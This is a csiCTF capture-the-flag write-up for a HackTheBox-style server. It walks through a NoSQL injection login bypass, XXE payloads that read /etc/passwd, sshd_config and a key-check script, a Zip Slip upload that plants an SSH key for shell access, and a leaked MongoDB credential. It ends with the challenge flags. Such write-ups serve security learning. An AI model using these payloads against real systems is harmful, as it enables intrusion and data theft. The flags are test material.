Server is at 34.93.215.188.

## Solution
>Welcome to the interesting part of the csiCTF, HTB. xD

### <a name="htb0x2"></a>HTB 0x2

* This is a HackTheBox-like challenge, the server's `IP address` is given
* Run a simple port scan using `nmap`<br/>

```s
$ nmap -sC -sV 34.93.215.188 -Pn
```

* This reveals the following open ports<br/>

```
22/tcp     open       ssh
3000/tcp   open       http
```

* Notice `http port 3000`
* Visiting [http://34.93.215.188:3000/](http://34.93.215.188:3000/), we see a login form
* Trying `SQL Injection (SQLi)`, nothing happens (although another vulnerability exists - `XSS`)
* Then trying `NoSQL Injection`, we are logged in successfully<br/>

**Payload**
```
# Use in POST parameter
username[$ne]=f4ke&password[$ne]=fl4g
```
                                                                                                                                                                                            
* Visiting `/robots.txt`, we see `/admin` is disallowed                                                                                                                                     
* Visit `/admin` and get the flag `csictf{n0t_4ll_1nj3ct10n5_4re_SQLi}` in the source code                                                                                                  
                                                                                                                                                                                            
                                                                                                                                                                                            
### <a name="htb0x5"></a>HTB 0x5

* As seen in write-up [HTB 0x2](#htb0x2), there is an `/admin` page
* This page is vulnerable to `XML External Entity (XXE) Injection`
* The vulnerability can be confirmed by using the `XXE detection payload`<br/>

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

* We get the `/etc/passwd` file which contains a GitHub link<br/>

```
root:root:x:0:0:root:/root:/bin/bash
...
...
...
gke-dbbca0b7b97e65e155bf:x:1004:1005::/home/gke-dbbca0b7b97e65e155bf:/bin/bash

https://gist.github.com/sivel/c68f601137ef9063efd7
```

* The [GitHub link](https://gist.github.com/sivel/c68f601137ef9063efd7) is about using a `custom ssh configuration`, this hints us to check the `sshd_config` file
* Obtain `sshd_config` by exploiting the `XXE Injection` vulnerability in `/admin`<br/>

**Payload**
```

<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/ssh/sshd_config" >]>
<foo>&xxe;</foo>
```

* Find the flag commented out in the obtained file<br/>

```

AuthorizedKeysCommandUser nobody

### HTB 0x3,0x4,0x6

* As seen in write-up [HTB 0x5](#htb0x5), we get the following contents from the sshd_config file.<br/>

```

Lets focus on `AuthorizedKeysCommand` right below the previous flag in the config file,
```
#AuthorizedPrincipalsFile none
# csictf{cu5t0m_4uth0rizat10n}
AuthorizedKeysCommand /usr/local/bin/userkeys.sh
AuthorizedKeysCommandUser nobody
```
Hmm, seems like they are using a custom check for authorizing the users. Wish we could read what is in the /usr/local/bin/userkeys.sh. Oh yes, we have that xml vulnerability. Lets use that to get the contents of the file.
Using this payload for xml injection, 
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///usr/local/bin/userkeys.sh'>]><root>&test;</root>
```

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/1.png)

Let's beautify the content,
```bash
#!/bin/bash

if [ \"$1\" == \"csictf\" ]; then
        cat /home/administrator/uploads/keys/*
else
        echo \"\"
fi
```
So as per the code, when we try to ssh to the IP, the user we try to ssh into is passed as $1(argument 1) to the sh file. If the user we try to ssh into is csictf (i.e if $1==csictf), then it will check if our public key exists in the list of keys present in /home/administrator/uploads/keys/. All these inferences were drawn by looking into the functioning of ssh.

So our aim is simple, we need to put our public key into the /home/administrator/uploads/key folder. So we go back to the uploading zip file location. The upload function has the [Zip Slip Vulnerability](https://github.com/snyk/zip-slip-vulnerability)
```
$ ssh-keygen -t rsa     #filename:my_key
$ 7z a zip-slip.zip my_key.pub
$ 7z rn zip-slip.zip my_key.pub '../../../../../../../../../../home/administrator/uploads/keys/dunsp4rce.pub'
```
So we first generate out private and public keys using the command `ssh-keygen -t rsa` and name our key file `my_key`. 

Next we download the zip-slip.zip from the zip-slip repo mentioned above into the directory which has our keys. Now we append our public key to the zip file using ` 7z a zip-slip.zip my_key.pub`. 

We then rename the file to the folder we want to put our file to(vulnerability) `7z rn zip-slip.zip my_key.pub '../../../../../../../../../../home/administrator/uploads/keys/dunsp4rce.pub`. Since all the key are getting searched in /home/administrator/uploads/keys folder, we put our public key there. 

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/2.png)

You should get {"success":"true"} after uploading the zip to the server. The pub key seems to stay in the server for 5 mins before it gets deleted(cron job), so ssh into server before 5 mins of uploading public key.

Now that the hard part of adding our public key is done, we just have to ssh into csictf user `ssh -i my_key csictf@34.93.37.238` and voila `"We are in boissss!"`,

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/3.png)

It's almost cakewalk after this. We find a flag.txt in the home folder of csictf user, `csictf{w3lc0m3_t0_th3_s3rv3r}` 

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/4.png)

After greping for "csictf" from ~/ , I found the flag `csictf{exp0s3d_sec23ts}` in /home/administrator/website/models/db.js.

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/5.png)

Right below the flag in db.js , we find a mongodb connection url, we connect to that url using, `mongo "mongodb://web:9EAC744765EA6F26@34.93.215.188:27017/HTBDB"`

![alt text]({{site.baseurl}}/assets/HTB-0x[2-6]/6.png)

Then we check the list of databases available using `db` command. We find a HTBDB database, switch to it using `use HTBDB`.

List the collections in the db using `show collections`. We find three collections: stuff, user,users. We read all the documents in the collection stuff using `db.stuff.find()`. In one the documents, we find the flag `csictf{m0ng0_c0llect10ns_yay}`


 

## Flag
```
csictf{n0t_4ll_1nj3ct10n5_4re_SQLi}
csictf{cu5t0m_4uth0rizat10n}
csictf{w3lc0m3_t0_th3_s3rv3r}
csictf{exp0s3d_sec23ts}
csictf{m0ng0_c0llect10ns_yay}
```
